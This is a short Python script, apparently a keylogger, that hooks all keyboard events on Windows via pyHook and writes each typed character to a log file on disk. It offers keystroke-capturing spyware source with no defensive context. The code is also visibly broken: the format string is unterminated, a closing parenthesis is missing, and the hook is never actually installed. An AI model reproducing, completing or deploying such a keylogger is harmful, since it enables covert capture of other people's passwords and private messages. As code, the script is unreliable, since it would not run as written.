import pyHook, pythoncom, sys, logging 

file_log = 'C:\\important\\log.txt'

def OnkeyboardEvent(event):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format ='%(message)
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii)
	return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnkeyboardEvent
hooks_manager.HookManager()
pythoncom.PumpMessages()
